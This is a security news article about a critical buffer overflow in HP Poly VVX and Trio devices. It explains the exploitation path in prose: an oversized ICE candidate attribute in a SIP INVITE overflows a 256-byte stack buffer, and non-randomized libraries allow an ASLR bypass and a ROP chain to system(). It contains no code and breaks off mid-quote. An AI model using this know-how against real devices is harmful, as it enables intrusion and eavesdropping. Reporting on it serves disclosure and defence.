The flaw, rated 9.2 on the CVSS severity scale, affects all phones from the HP Poly VVX series, as well as the Trio 8300, 8500, and 8800 IP conference devices. HP has fixed the flaw in its Poly Unified Communications Software (UCS) versions 6.4.8 for the VVX devices, 8.1.7 for the Trio 8300, and 7.2.8 for Trio 8500 and 8800.

An exploit module targeting this vulnerability has already been developed and released for the widely used Metasploit penetration testing framework that’s maintained by Rapid7.

The exploit executes code as root on an affected device with ICE enabled by sending a SIP INVITE request with a specially crafted candidate attribute. This attribute normally contains a transport address that can be used for connectivity checks and is part of the ICE RFC8839 standard.

The buffer overflow bug is located in a helper function called ParseICECandidate in the polyapp binary that processes such requests on the device.

“The start of the function contains a call to memcpy , which will copy the incoming string line being processed into a 256 byte stack buffer,” Stephen Fewer, senior principal security researcher at Rapid7, said in a blog post . “No length check is performed to ensure the incoming string length is less than 256 bytes. Therefore by providing a candidate attribute whose length is greater than 256 bytes, a stack-based buffer overflow will occur.”

Address Space Layout Randomization (ASLR), a kernel feature that randomizes memory addresses to defeat buffer overflow exploits, is enabled on the device. However, the protection is not operating correctly on the HP Poly devices because it does not randomize the load addresses of .so (Shared Object) libraries.

These libraries, such as libc , are loaded by other processes, including the polyapp process, and because their memory addresses never change, they can be leveraged to bypass ASLR and execute the attacker’s payload.

“We create a ROP chain that will execute an arbitrary OS command via the system standard C library function,” Fewer said. “The accompanying Metasploit exploit modules source code details the entire ROP chain.”

Attackers have increasingly targeted embedded devices inside enterprise networks in recent years because unlike laptops, workstations, and servers, these devices are not monitored by endpoint detection and response (EDR) products. As such, they provide perfect footholds inside corporate environments that allow attackers to remain undetected for long periods of time and attack other systems.

In the age of AI these devices become even more relevant for attackers, going beyond corporate espionage by recording conversations or internal network pivoting.

“Attackers no longer need massive datasets to make use of synthetic speech tooling,” Douglas McKee, Rapid7’s director of vulnerability intelligence, said in a blog post . “In many cases, they just need clean source audio of the right person saying enough words in enough contexts. That has made executive voice data, call recordings, and live conversation capture far more valuable than many organizations seem prepared…
